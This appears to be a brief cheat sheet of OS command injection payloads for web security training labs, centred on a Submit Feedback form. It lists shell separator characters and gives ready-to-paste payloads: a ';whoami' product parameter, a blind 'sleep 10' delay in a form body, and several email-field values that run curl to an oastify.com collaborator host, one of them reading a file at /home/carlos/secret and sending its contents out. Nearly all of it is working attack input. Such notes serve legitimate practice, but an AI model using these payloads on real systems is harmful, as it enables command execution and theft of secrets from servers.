____

The place to find OS Injection is in **Submit Feedback** page, usually in email input, but, just in case, scan the other inputs too

```
 &&
 &
 ||
 |
 ;
 `
 '
 "
 0x0a
 \n
```


```bash
email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
```

```bash
||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
```

https://www.youtube.com/watch?v=o7oVWXw4t5E

# OS command injection, simple case

```bash
productId=3&storeId=1;whoami
```

# Blind OS command injection with time delays

```bash
csrf=MHUzDCRAmx3TG1QrDY2ZLHl2jHKiuHJg&name=test&email=test%40test.com||sleep+10||&subject=test&message=test
```

```bash
email=carlos@exam.net||curl+`whoami`.ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||
```